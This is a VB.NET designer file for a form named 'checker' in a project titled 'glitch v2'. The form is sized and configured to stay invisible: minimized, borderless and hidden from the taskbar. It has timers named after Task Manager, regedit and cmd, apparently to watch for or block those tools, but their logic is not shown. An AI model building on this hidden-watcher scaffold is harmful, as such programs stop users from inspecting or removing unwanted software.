<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class checker
    Inherits System.Windows.Forms.Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(checker))
        Me.checktaskmgr = New System.Windows.Forms.Timer(Me.components)
        Me.checkregedit = New System.Windows.Forms.Timer(Me.components)
        Me.checkcmd = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'checktaskmgr
        '
        '
        'checkregedit
        '
        '
        'checkcmd
        '
        '
        'checker
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(10, 10)
        Me.ControlBox = False
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "checker"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "g̴̘̈͛l̵̰͚̈́͛i̸̯͕͛t̴͍̳̀c̶̯͌̈ḩ̴̱̋ ̷̍͜͝v̸̮͒̾2̸̖́  | checker"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents checktaskmgr As Timer
    Friend WithEvents checkregedit As Timer
    Friend WithEvents checkcmd As Timer
End Class
